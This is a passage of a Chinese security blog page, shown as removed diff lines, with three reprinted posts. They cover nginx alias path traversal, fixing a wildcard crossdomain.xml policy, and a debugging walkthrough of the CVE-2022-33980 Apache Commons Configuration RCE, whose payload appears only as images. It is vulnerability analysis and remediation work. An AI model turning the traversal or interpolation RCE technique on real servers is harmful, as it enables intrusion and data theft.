-<p>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</p>
-<p>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</p>
-<p>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</p>
-</blockquote>
-<h2><span id="0x04-参考链接">0x04 参考链接</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/317201">https://hackerone.com/reports/317201</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/312510">https://hackerone.com/reports/312510</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/Crossdomain-XML/">
-                怎么把网站crossdomain.xml配置风险去除
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="怎么把网站crossdomainxml配置风险去除">怎么把网站crossdomain.xml配置风险去除</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/AoJYq0YYQe">nanjingbolg</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>打开程序目录下的crossdomain.xml文件，确保配置只对提供安全资源的可信域开放：</p>
-<p>源代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE cross-domain-policy SYSTEM ”http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd”&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=”*” /&gt;&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文件中的allow-access-from 实体设置为星号设置为允许任何域访问，将其修改为:</p>
-<p><code>&lt;allow-access-from domain=”*.17showshow.com” /&gt;</code></p>
-<p>*.17showshow.com 换为您自己的域名(注意是一级域名)。</p>
-<p>表示只允许本域访问，该问题就解决了。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XML/" rel="tag">XML</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
-                关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="关于cve-2022-33980-apache-commons-configuration-远程命令执行漏洞分析">关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/543936119">星阑科技</a> 并作补充</p>
-</blockquote>
-<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
-<p>7月6日，Apache官方发布安全公告，修复了一个存在于Apache Commons Configuration 组件的远程代码执行漏洞，漏洞编号：CVE-2022-33980，漏洞威胁等级：高危。恶意攻击者通过该漏洞，可在目标服务器上实现任意代码执行。</p>
-</blockquote>
-<h2><span id="相关介绍">相关介绍</span></h2><blockquote>
-<p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理，提高开发效率和软件的可维护性。</p>
-</blockquote>
-<h2><span id="利用范围">利用范围</span></h2><blockquote>
-<p>2.4 &lt;&#x3D; Apache Commons Configuration &lt;&#x3D;2.7</p>
-</blockquote>
-<h2><span id="前置知识">前置知识</span></h2><blockquote>
-<p>什么是变量插值？</p>
-<p>通常我们用apach的configuration2库来管理配置文件(org.apache.commons:commons-configuration2),在commons-configuration2管理的配置文件中，配置变量的值可以引用变量。举个例子：${env:xxhzz}就指代环境变量xxhzz，在commons-configuration2中这种引用动态变量的方式就叫变量插值。</p>
-<p>变量插值解析：在commons-configuration2中，负责对字符串中的变量进行解析的是org.apache.commons.configuration2.interpol.ConfigurationInterpolator类中的interpolate(Object)方法。</p>
-</blockquote>
-<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/1.png" alt="image"></p>
-<p>从漏洞通告中，可以得知Apache Commons Configuration执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的org.apache.commons.configuration2.interpol.Lookup 实例。</p>
-<p>从2.4版到2.7版，默认的Lookup实例集包括可能导致任意代码执行或与远程服务器联系的插值器。如公告中提到“script” 可使用JVM脚本执行引擎(javax.script)执行表达式，若使用了不受信任的配置值，在受影响的版本中使用插值默认值的应用程序就很可能受到远程代码执行的影响。</p>
-</blockquote>
-<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
-<p>了解了漏洞原理后，为更好理解漏洞的形成，需构建一个调试的demo环境。</p>
-<p>通过maven直接引入Apache Commons Configuration2.7。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/2.png" alt="image"></p>
-<p>接着构建一个触发漏洞的主类即可</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/3.png" alt="image"></p>
-</blockquote>
-<h2><span id="动态调式">动态调式</span></h2><blockquote>
-<p>在对插值变量进行解析的地方打下断点。</p>
-<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/4.png" alt="image"></p>
-<p>开启debug模式，在经过了前两个if判断之后，随后会进入resolveSingleVariable函数。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/5.png" alt="image"></p>
-<p>在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable中首先跟一下extractVariableName函数。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/6.png" alt="image"></p>
-<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName的作用是提取变量字符串strValue。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/7.png" alt="image"></p>
-<p>随后进入org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve函数中，通过index0f查找和判断条件，从变量字符串中分别获取到prefix和name。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/8.png" alt="image"></p>
-<p>继续跟进会进入lookup函数。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/9.png" alt="image"></p>
-<p>在分析lookup函数前先跟进下fetchLookupForPrefix函数。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/10.png" alt="image"></p>
-<p>fetchLookupForPrefix函数的作用是获取到stringLookup对象。</p>
-<p>继续跟进，会进入commons-text-1.8.jar包中的org.apache.commons.text.lookup.ScriptStringLookup#lookup函数。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/11.png" alt="image"></p>
-<p>在org.apache.commons.text.lookup.ScriptStringLookup#lookup函数中会再次对字符串进行分割，分别提取engineName和script。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/12.png" alt="image"></p>
-<p>接着会通过getEngineByName函数获取ScriptEngine（javax.script)。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/13.png" alt="image"></p>
-<p>继续往下，出现eval函数。而我们知道eval函数可计算某个字符串，并执行其中的的JavaScript 代码。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/14.png" alt="image"></p>
-<p>继续往下将成功触发我们传入的payload，造成远程命令执行。</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/15.png" alt="image"></p>
-<p>​成功命令执行。</p>
-<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/16.png" alt="image"></p>
-</blockquote>
-<h2><span id="修复建议">修复建议</span></h2><blockquote>
-<p>目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到 Apache Commons Configuration 2.8.0 版本。<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-configuration/download_configuration.cgi">https://commons.apache.org/proper/commons-configuration/download_configuration.cgi</a></p>
-</blockquote>
-<h2><span id="参考材料">参考材料</span></h2><blockquote>
-<p>1.<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s">https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s</a><br>2.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/devel">https://cloud.tencent.com/devel</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
